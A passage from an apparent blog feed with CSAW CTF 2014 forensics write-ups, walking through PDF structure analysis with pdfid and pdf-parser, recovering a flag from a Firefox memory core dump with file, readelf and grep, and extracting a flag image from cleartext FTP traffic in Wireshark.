&lt;p&gt;Let's suppose we had no clue that the flag would just be a text in the file. In this case, we would want to examine the file's structure. For this task we use the &lt;a href="http://blog.didierstevens.com/programs/pdf-tools/"&gt;PDF Tool&lt;/a&gt; suite, which is written in Python.&lt;/p&gt;
&lt;h4&gt;pdfid&lt;/h4&gt;
&lt;p&gt;We start with &lt;em&gt;pdfid.py&lt;/em&gt;, which parses the PDF  looking for certain  keywords. We download and unzip that script, and then we make it an executable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unzip pdfid_v0_1_2.zip
$ chmod a+x pdfid.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running over our file gives:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdfid.py pdf.pdf
PDFiD &lt;span class="m"&gt;0&lt;/span&gt;.1.2 pdf.pdf
 PDF Header: %PDF-1.3
 obj                   &lt;span class="m"&gt;20&lt;/span&gt;
 endobj                &lt;span class="m"&gt;19&lt;/span&gt;
 stream                &lt;span class="m"&gt;10&lt;/span&gt;
 endstream             &lt;span class="m"&gt;10&lt;/span&gt;
 xref                   &lt;span class="m"&gt;1&lt;/span&gt;
 trailer                &lt;span class="m"&gt;1&lt;/span&gt;
 startxref              &lt;span class="m"&gt;1&lt;/span&gt;
 /Page                  &lt;span class="m"&gt;1&lt;/span&gt;
 /Encrypt               &lt;span class="m"&gt;0&lt;/span&gt;
 /ObjStm                &lt;span class="m"&gt;0&lt;/span&gt;
 /JS                    &lt;span class="m"&gt;0&lt;/span&gt;
 /JavaScript            &lt;span class="m"&gt;0&lt;/span&gt;
 /AA                    &lt;span class="m"&gt;0&lt;/span&gt;
 /OpenAction            &lt;span class="m"&gt;0&lt;/span&gt;
 /AcroForm              &lt;span class="m"&gt;0&lt;/span&gt;
 /JBIG2Decode           &lt;span class="m"&gt;0&lt;/span&gt;
 /RichMedia             &lt;span class="m"&gt;0&lt;/span&gt;
 /Launch                &lt;span class="m"&gt;0&lt;/span&gt;
 /EmbeddedFile          &lt;span class="m"&gt;0&lt;/span&gt;
 /XFA                   &lt;span class="m"&gt;0&lt;/span&gt;
 /Colors &amp;gt; &lt;span class="m"&gt;2&lt;/span&gt;^24         &lt;span class="m"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, no funny stuff going on here. We need to look deeper into each of the these streams.&lt;/p&gt;
&lt;h4&gt;pdf-parser&lt;/h4&gt;
&lt;p&gt;We download &lt;em&gt;pdf-parser.py&lt;/em&gt;, which is used to search for all the fundamental elements in a PDF file. Let's take a closer look:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unzip pdf-parser_V0_4_3.zip
$ chmod a+x pdf-parser.py
$ ./pdf-parser.py
Usage: pdf-parser.py &lt;span class="o"&gt;[&lt;/span&gt;options&lt;span class="o"&gt;]&lt;/span&gt; pdf-file&lt;span class="p"&gt;|&lt;/span&gt;zip-file&lt;span class="p"&gt;|&lt;/span&gt;url
pdf-parser, use it to parse a PDF document

Options:
  --version             show program&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s version number and &lt;span class="nb"&gt;exit&lt;/span&gt;
  -s SEARCH, --search&lt;span class="o"&gt;=&lt;/span&gt;SEARCH
                        string to search in indirect objects &lt;span class="o"&gt;(&lt;/span&gt;except streams&lt;span class="o"&gt;)&lt;/span&gt;
  -f, --filter          pass stream object through filters &lt;span class="o"&gt;(&lt;/span&gt;FlateDecode,
                        ASCIIHexDecode, ASCII85Decode, LZWDecode and
                        RunLengthDecode only&lt;span class="o"&gt;)&lt;/span&gt;
  -o OBJECT, --object&lt;span class="o"&gt;=&lt;/span&gt;OBJECT
                        id of indirect object to &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;version independent&lt;span class="o"&gt;)&lt;/span&gt;
  -r REFERENCE, --reference&lt;span class="o"&gt;=&lt;/span&gt;REFERENCE
                        id of indirect object being referenced &lt;span class="o"&gt;(&lt;/span&gt;version
                        independent&lt;span class="o"&gt;)&lt;/span&gt;
  -e ELEMENTS, --elements&lt;span class="o"&gt;=&lt;/span&gt;ELEMENTS
                        &lt;span class="nb"&gt;type&lt;/span&gt; of elements to &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;cxtsi&lt;span class="o"&gt;)&lt;/span&gt;
  -w, --raw             raw output &lt;span class="k"&gt;for&lt;/span&gt; data and filters
  -a, --stats           display stats &lt;span class="k"&gt;for&lt;/span&gt; pdf document
  -t TYPE, --type&lt;span class="o"&gt;=&lt;/span&gt;TYPE  &lt;span class="nb"&gt;type&lt;/span&gt; of indirect object to &lt;span class="k"&gt;select&lt;/span&gt;
  -v, --verbose         display malformed PDF elements
  -x EXTRACT, --extract&lt;span class="o"&gt;=&lt;/span&gt;EXTRACT
                        filename to extract malformed content to
  -H, --hash            display &lt;span class="nb"&gt;hash&lt;/span&gt; of objects
  -n, --nocanonicalizedoutput
                        &lt;span class="k"&gt;do&lt;/span&gt; not canonicalize the output
  -d DUMP, --dump&lt;span class="o"&gt;=&lt;/span&gt;DUMP  filename to dump stream content to
  -D, --debug           display debug info
  -c, --content         display the content &lt;span class="k"&gt;for&lt;/span&gt; objects without streams or
                        with streams without filters
  --searchstream&lt;span class="o"&gt;=&lt;/span&gt;SEARCHSTREAM
                        string to search in streams
  --unfiltered          search in unfiltered streams
  --casesensitive       &lt;span class="k"&gt;case&lt;/span&gt; sensitive search in streams
  --regex               use regex to search in streams
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Very interesting! We run it with our file, searching for the string &lt;em&gt;/ProcSet&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdf-parser.py  pdf.pdf &lt;span class="p"&gt;|&lt;/span&gt; grep  /ProcSet
        /ProcSet &lt;span class="o"&gt;[&lt;/span&gt; /ImageC /Text /PDF /ImageI /ImageB &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Awesome! Even though we don't see any text in the file (when we opened it in the PDF viewer), there is text somewhere!&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Getting Text from PDF&lt;/h2&gt;
&lt;p&gt;A good way to extract text from a pdf is using &lt;a href="http://en.wikipedia.org/wiki/Pdftotext"&gt;pdftotext&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pdftotext pdf.pdf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You should get a &lt;code&gt;pdf.txt&lt;/code&gt; file. Reading it with Linux's commands &lt;code&gt;cat&lt;/code&gt; or &lt;code&gt;strings&lt;/code&gt;gives you the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ strings pdf.txt
flag&lt;span class="o"&gt;{&lt;/span&gt;security_through_obscurity&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As a note, there are several other PDF forensics tools that are worth to be mentioned: &lt;a href="http://esec-lab.sogeti.com/pages/Origami"&gt;Origami&lt;/a&gt; (pdfextract extracts JavaScript from PDF files), &lt;a href="http://blog.zeltser.com/post/3235995383/pdf-stream-dumper-malicious-file-analysis"&gt;PDF Stream Dumper&lt;/a&gt; (several PDF analysis tools), &lt;a href="http://blog.zeltser.com/post/6780160077/peepdf-malicious-pdf-analysis"&gt;Peepdf&lt;/a&gt; (command-line shell for examining PDF), &lt;a href="https://github.com/9b/pdfxray_lite"&gt;PDF X-RAY Lite&lt;/a&gt; (creates an HTML report with decoded file structure and contents), &lt;a href="http://blog.zeltser.com/post/12615013257/extracting-swf-from-pdf-using-swf-mastah"&gt;SWF mastah&lt;/a&gt; (extracts SWF objects), &lt;a href="for examining and decoding structure and content of PDF files"&gt;Pyew&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="pdf-parser"></category><category term="pdftotext"></category></entry><entry><title>CSAW CTF 2014 - Forensics 100: "dumpster diving"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-100-dumpster-diving.html" rel="alternate"></link><published>2014-09-22T06:20:00-04:00</published><updated>2014-09-22T06:20:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:/csaw-ctf-2014-forensics-100-dumpster-diving.html</id><summary type="html">&lt;p&gt;This was the first forensic challenge. It starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;dumpsters are cool, but cores are cooler&lt;/p&gt;
&lt;p&gt;Written by marc&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/606580b079e73e14ab2751e35d22ad44/firefox.mem.zip"&gt;firefox.mem.zip&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Unziping firefox.mem.zip&lt;/h2&gt;
&lt;p&gt;The given file has a funny extension &lt;em&gt;.mem.zip&lt;/em&gt;. Before we go ahead and unzip it, let's try to learn more …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This was the first forensic challenge. It starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;dumpsters are cool, but cores are cooler&lt;/p&gt;
&lt;p&gt;Written by marc&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/606580b079e73e14ab2751e35d22ad44/firefox.mem.zip"&gt;firefox.mem.zip&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Unziping firefox.mem.zip&lt;/h2&gt;
&lt;p&gt;The given file has a funny extension &lt;em&gt;.mem.zip&lt;/em&gt;. Before we go ahead and unzip it, let's try to learn more about this file. To do this we choose to use the Linux's command &lt;a href="http://en.wikipedia.org/wiki/File_(command)"&gt;file&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file --help
Usage: file &lt;span class="o"&gt;[&lt;/span&gt;OPTION...&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;FILE...&lt;span class="o"&gt;]&lt;/span&gt;
Determine &lt;span class="nb"&gt;type&lt;/span&gt; of FILEs.

      --help                 display this &lt;span class="nb"&gt;help&lt;/span&gt; and &lt;span class="nb"&gt;exit&lt;/span&gt;
  -v, --version              output version information and &lt;span class="nb"&gt;exit&lt;/span&gt;
  -m, --magic-file LIST      use LIST as a colon-separated list of magic
                               number files
  -z, --uncompress           try to look inside compressed files
  -b, --brief                &lt;span class="k"&gt;do&lt;/span&gt; not prepend filenames to output lines
  -c, --checking-printout    print the parsed form of the magic file, use in
                               conjunction with -m to debug a new magic file
                               before installing it
  -e, --exclude TEST         exclude TEST from the list of &lt;span class="nb"&gt;test&lt;/span&gt; to be
                               performed &lt;span class="k"&gt;for&lt;/span&gt; file. Valid tests are:
                               apptype, ascii, cdf, compress, elf, encoding,
                               soft, tar, text, tokens
  -f, --files-from FILE      &lt;span class="nb"&gt;read&lt;/span&gt; the filenames to be examined from FILE
  -F, --separator STRING     use string as separator instead of &lt;span class="sb"&gt;`&lt;/span&gt;:&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
&lt;span class="s1"&gt;  -i, --mime                 output MIME type strings (--mime-type and&lt;/span&gt;
&lt;span class="s1"&gt;                               --mime-encoding)&lt;/span&gt;
&lt;span class="s1"&gt;      --apple                output the Apple CREATOR/TYPE&lt;/span&gt;
&lt;span class="s1"&gt;      --mime-type            output the MIME type&lt;/span&gt;
&lt;span class="s1"&gt;      --mime-encoding        output the MIME encoding&lt;/span&gt;
&lt;span class="s1"&gt;  -k, --keep-going           don&amp;#39;&lt;/span&gt;t stop at the first match
  -l, --list                 list magic strength
  -L, --dereference          follow symlinks &lt;span class="o"&gt;(&lt;/span&gt;default&lt;span class="o"&gt;)&lt;/span&gt;
  -h, --no-dereference       don&lt;span class="s1"&gt;&amp;#39;t follow symlinks&lt;/span&gt;
&lt;span class="s1"&gt;  -n, --no-buffer            do not buffer output&lt;/span&gt;
&lt;span class="s1"&gt;  -N, --no-pad               do not pad output&lt;/span&gt;
&lt;span class="s1"&gt;  -0, --print0               terminate filenames with ASCII NUL&lt;/span&gt;
&lt;span class="s1"&gt;  -p, --preserve-date        preserve access times on files&lt;/span&gt;
&lt;span class="s1"&gt;  -r, --raw                  don&amp;#39;&lt;/span&gt;t translate unprintable chars to &lt;span class="se"&gt;\o&lt;/span&gt;oo
  -s, --special-files        treat special &lt;span class="o"&gt;(&lt;/span&gt;block/char devices&lt;span class="o"&gt;)&lt;/span&gt; files as
                             ordinary ones
  -C, --compile              compile file specified by -m
  -d, --debug                print debugging messages
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We find the flag &lt;code&gt;-z&lt;/code&gt;, which allows us to look inside the zipped files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$  file -z firefox.mem.zip
firefox.mem.zip: ELF &lt;span class="m"&gt;64&lt;/span&gt;-bit LSB core file x86-64, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Zip archive data, at least v2.0 to extract&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cool! So let's go ahead and unzip this file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unzip firefox.mem.zip nzip firefox.mem.zip
Archive:  firefox.mem.zip
  inflating: firefox.mem
   creating: __MACOSX/
  inflating: __MACOSX/._firefox.mem
&lt;/pre&gt;&lt;/div&gt;


&lt;hr&gt;
&lt;h2&gt;Extra: Learning More about the &lt;em&gt;.mem&lt;/em&gt; File&lt;/h2&gt;
&lt;p&gt;This is a very weird file extension. If you google &lt;em&gt;.mem&lt;/em&gt;, you don't find much, it's clear it's a memory file, but what now?  From the &lt;em&gt;file&lt;/em&gt; command, we learned that this is an &lt;em&gt;ELF 64-bit LSB core&lt;/em&gt;. Let's understand this  by parts.&lt;/p&gt;
&lt;p&gt;An &lt;a href="http://en.wikipedia.org/wiki/Executable_and_Linkable_Format"&gt;ELF&lt;/a&gt; file  (Executable and Linkable Format) is a standard file format for executables, object code, shared libraries, and core dumps. The cool thing about ELF is that it's not bound to any particular architecture.&lt;/p&gt;
&lt;p&gt;In Linux, we can use the command &lt;a href="http://linux.die.net/man/1/readelf"&gt;readelf&lt;/a&gt; to displays information about ELF files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ readelf firefox.mem
Usage: readelf &amp;lt;option&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&amp;gt; elf-file&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;
 Display information about the contents of ELF format files
 Options are:
  -a --all               Equivalent to: -h -l -S -s -r -d -V -A -I
  -h --file-header       Display the ELF file header
  -l --program-headers   Display the program headers
     --segments          An &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; --program-headers
  -S --section-headers   Display the sections&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; header
     --sections          An &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; --section-headers
  -g --section-groups    Display the section groups
  -t --section-details   Display the section details
  -e --headers           Equivalent to: -h -l -S
  -s --syms              Display the symbol table
     --symbols           An &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; --syms
  --dyn-syms             Display the dynamic symbol table
  -n --notes             Display the core notes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
  -r --relocs            Display the relocations &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
  -u --unwind            Display the unwind info &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
  -d --dynamic           Display the dynamic section &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
  -V --version-info      Display the version sections &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
  -A --arch-specific     Display architecture specific information &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; any&lt;span class="o"&gt;)&lt;/span&gt;
  -c --archive-index     Display the symbol/file index in an archive
  -D --use-dynamic       Use the dynamic section info when displaying symbols
  -x --hex-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt;
                         Dump the contents of section &amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt; as bytes
  -p --string-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt;
                         Dump the contents of section &amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt; as strings
  -R --relocated-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt;
                         Dump the contents of section &amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt; as relocated bytes
  -w&lt;span class="o"&gt;[&lt;/span&gt;lLiaprmfFsoRt&lt;span class="o"&gt;]&lt;/span&gt; or
  --debug-dump&lt;span class="o"&gt;[=&lt;/span&gt;rawline,&lt;span class="o"&gt;=&lt;/span&gt;decodedline,&lt;span class="o"&gt;=&lt;/span&gt;info,&lt;span class="o"&gt;=&lt;/span&gt;abbrev,&lt;span class="o"&gt;=&lt;/span&gt;pubnames,&lt;span class="o"&gt;=&lt;/span&gt;aranges,&lt;span class="o"&gt;=&lt;/span&gt;macro,&lt;span class="o"&gt;=&lt;/span&gt;frames,
               &lt;span class="o"&gt;=&lt;/span&gt;frames-interp,&lt;span class="o"&gt;=&lt;/span&gt;str,&lt;span class="o"&gt;=&lt;/span&gt;loc,&lt;span class="o"&gt;=&lt;/span&gt;Ranges,&lt;span class="o"&gt;=&lt;/span&gt;pubtypes,
               &lt;span class="o"&gt;=&lt;/span&gt;gdb_index,&lt;span class="o"&gt;=&lt;/span&gt;trace_info,&lt;span class="o"&gt;=&lt;/span&gt;trace_abbrev,&lt;span class="o"&gt;=&lt;/span&gt;trace_aranges&lt;span class="o"&gt;]&lt;/span&gt;
                         Display the contents of DWARF2 debug sections
  --dwarf-depth&lt;span class="o"&gt;=&lt;/span&gt;N        Do not display DIEs at depth N or greater
  --dwarf-start&lt;span class="o"&gt;=&lt;/span&gt;N        Display DIEs starting with N, at the same depth
                         or deeper
  -I --histogram         Display histogram of bucket list lengths
  -W --wide              Allow output width to exceed &lt;span class="m"&gt;80&lt;/span&gt; characters
  @&amp;lt;file&amp;gt;                Read options from &amp;lt;file&amp;gt;
  -H --help              Display this information
  -v --version           Display the version number of readelf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In addition, &lt;a href="http://en.wikipedia.org/wiki/Linux_Standard_Base"&gt;LSB&lt;/a&gt; stands for &lt;em&gt;Linux Standard Base&lt;/em&gt;, which is a joint project by several Linux distributions. It specifies standard libraries, a number of commands and utilities that extend the POSIX standard, the layout of the file system hierarchy, run levels, the printing system, etc.&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Extracting Information from the &lt;em&gt;.mem&lt;/em&gt; File&lt;/h2&gt;
&lt;p&gt;It turned out that we don't even need to know anything about the file to find the flag. All we need to do is to search for the &lt;em&gt;flag&lt;/em&gt; string:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat firefox.mem &lt;span class="p"&gt;|&lt;/span&gt; grep -a &lt;span class="s1"&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt;
P��negativeone_or_fdZZZZZZZZZZZZnegativeone_or_nothingZZnegativeone_or_ssize_tZZd_name_extra_sizeZZZZZZZZZZZZnull_or_dirent_ptrZZZZZZZZZZOSFILE_SIZEOF_DIRZZZZZZZZZZZZ���� 3���������ZZZZZZZH�f�L��L��ZZ����@�m���������ZZZZZZZAG�@r���y��ZZZZZZZZflag&lt;span class="o"&gt;{&lt;/span&gt;cd69b4957f06cd818d7bf3d61980e291&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yay! We found the flag: &lt;strong&gt;cd69b4957f06cd818d7bf3d61980e291&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="readelf"></category><category term="mem"></category></entry><entry><title>CSAW CTF 2014 - Forensics 200: "why not sftp?"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-200-why-not-sftp.html" rel="alternate"></link><published>2014-09-22T05:20:00-04:00</published><updated>2014-09-22T05:20:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:/csaw-ctf-2014-forensics-200-why-not-sftp.html</id><summary type="html">&lt;p&gt;The purpose of this problem is to teach about the need of encrypting your data. The &lt;a href="http://en.wikipedia.org/wiki/File_Transfer_Protocol"&gt;FTP&lt;/a&gt;  protocol sends clear text over the wire, &lt;em&gt;i.e&lt;/em&gt;  the  data is transmitted without any encryption.
 &lt;a href="http://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol"&gt;SSH/Secure File Transfer Protocol&lt;/a&gt; is a network protocol providing secure file transfer. Using SFTP, instead of …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The purpose of this problem is to teach about the need of encrypting your data. The &lt;a href="http://en.wikipedia.org/wiki/File_Transfer_Protocol"&gt;FTP&lt;/a&gt;  protocol sends clear text over the wire, &lt;em&gt;i.e&lt;/em&gt;  the  data is transmitted without any encryption.
 &lt;a href="http://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol"&gt;SSH/Secure File Transfer Protocol&lt;/a&gt; is a network protocol providing secure file transfer. Using SFTP, instead of FTP, would avoid to find the flag in this problem in the way we did.&lt;/p&gt;
&lt;p&gt;This is the second forensics problem and it starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;well seriously, why not?&lt;/p&gt;
&lt;p&gt;Written by marc&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/7831788f2ab94feddc72ce53e80fda5f/traffic-5.pcap"&gt;traffic-5.pcap&lt;/a&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Analyzing the PCAP File&lt;/h2&gt;
&lt;p&gt;Now let's search for the flag! We open the &lt;a href="http://en.wikipedia.org/wiki/Pcap"&gt;pcap&lt;/a&gt; file in &lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt; (an open-source packet analyzer). There are several things that we could search for in this file, for instance we could look for FTP transactions or we could search for strings such as &lt;em&gt;password&lt;/em&gt; or &lt;em&gt;flag&lt;/em&gt;. We show both approaches.&lt;/p&gt;
&lt;h2&gt;Solution 1: Searching for the string &lt;em&gt;flag&lt;/em&gt;&lt;/h2&gt;
&lt;h4&gt;Going in the Wrong Way&lt;/h4&gt;
&lt;p&gt;So the first thing I did was searching for the string &lt;em&gt;password&lt;/em&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Go to Edit&lt;/li&gt;
&lt;li&gt;Go to Find Packet&lt;/li&gt;
&lt;li&gt;Search for password choosing the options string and packet bytes.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Clicking on &lt;em&gt;Follow TCP Stream&lt;/em&gt; gives:
&lt;img alt="" src="http://i.imgur.com/c61P5Aj.png"&gt;&lt;/p&gt;
&lt;p&gt;Nope. This is a misleading information!&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;But We Were Almost There!&lt;/h4&gt;
&lt;p&gt;Now, if we search for &lt;em&gt;flag&lt;/em&gt; we actually find something:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/knuwJFq.png"&gt;&lt;/p&gt;
&lt;p&gt;We find the packet with a file named flag! Awesome.&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Solution 2: Looking for the FTP Protocols&lt;/h2&gt;
&lt;p&gt;All right, let's use another information we have: it should be something related to the FTP protocol. In Wireshark, we can find specific protocol with filters. We want to filter for FTP with some data. We start trying the usual FTP-DATA port:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcp.port==21
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nope. The results should be another port. Let's search explicitly for:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ftp-data
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cool, we found a few packets:
&lt;img alt="" src="http://i.imgur.com/cWhiXZD.png"&gt;&lt;/p&gt;
&lt;p&gt;We don't need to scroll down too much to find a packet with  a string flag on it! Awesome.&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Extracting the File&lt;/h2&gt;
&lt;p&gt;Once we find the packet with any of the methods above, we right-click it selecting &lt;em&gt;Follow TCP Stream&lt;/em&gt;. This leads to:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/LZTse2s.png"&gt;&lt;/p&gt;
&lt;p&gt;The file &lt;em&gt;flag.png&lt;/em&gt; is our flag. To extract it we  click in the &lt;em&gt;Save as&lt;/em&gt; button, then in the terminal we can use the command &lt;a href="http://en.wikipedia.org/wiki/File_(command)"&gt;file&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file s.whatever
s.whatever: Zip archive data, at least v2.0 to extract
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Awesome, so all we need is to &lt;em&gt;unzip&lt;/em&gt; this file and we get &lt;em&gt;flag.png&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/WcxyITv.png"&gt;&lt;/p&gt;
&lt;h4&gt;Extra: Finding files with &lt;em&gt;File Signatures&lt;/em&gt;&lt;/h4&gt;
&lt;p&gt;If we don't know the name of the file we are looking for, but we know its type, we can search for its &lt;a href="http://en.wikipedia.org/wiki/File_signature"&gt;file signature&lt;/a&gt;, which can be found &lt;a href="http://en.wikipedia.org/wiki/List_of_file_signatures"&gt;here&lt;/a&gt; (a hex value).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hack all the Things!&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="Wireshark"></category><category term="FTP"></category></entry></feed>